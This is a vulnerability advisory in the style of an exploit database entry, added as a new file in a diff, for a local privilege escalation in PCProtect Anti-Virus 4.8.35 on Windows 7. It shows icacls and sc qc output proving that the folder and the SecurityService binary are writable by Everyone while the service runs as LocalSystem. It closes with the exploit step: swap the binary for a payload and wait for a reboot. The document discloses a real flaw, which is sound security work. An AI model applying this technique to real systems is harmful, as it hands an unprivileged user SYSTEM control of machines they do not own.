@@ -1,0 +1,57 @@
+# Exploit Title: PCProtect 4.8.35 - Privilege Escalation
+# Date: 2018-09-11
+# Exploit Author: Hashim Jawad - @ihack4falafel
+# Vendor Homepage: https://www.pcprotect.com/
+# Vulnerable Software: https://www.pcprotect.com/download
+# Tested on: Windows 7 Enterprise SP1 (x64)
+
+# Description:
+# PCProtect Anti-Virus v4.8.35 installs by default to "C:\Program Files (x86)\PCProtect" with very 
+# weak folder permissions granting any user full permission "Everyone: (F)" to the contents of the 
+# directory and it's subfolders. In addition, the program installs a service called "SecurityService" 
+# which runs as "Local system account", this will allow any user to escalate privileges 
+# to "NT AUTHORITY\SYSTEM" by substituting the service's binary with malicious one.
+
+# PoC
+
+C:\Users\IEUser>icacls "c:\Program Files (x86)\PCProtect"
+c:\Program Files (x86)\PCProtect BUILTIN\Users:(OI)(CI)(F)
+                                 Everyone:(OI)(CI)(F)
+                                 NT SERVICE\TrustedInstaller:(I)(F)
+                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                                 NT AUTHORITY\SYSTEM:(I)(F)
+                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                                 BUILTIN\Administrators:(I)(F)
+                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                                 BUILTIN\Users:(I)(RX)
+                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\IEUser>sc qc SecurityService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SecurityService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : PC Security Management Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\IEUser>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
+                                                     Everyone:(I)(F)
+                                                     NT AUTHORITY\SYSTEM:(I)(F)
+                                                     BUILTIN\Administrators:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\IEUser>
+
+# Exploit:
+# Simply replace "SecurityService.exe" with your preferred payload and wait for execution upon reboot.
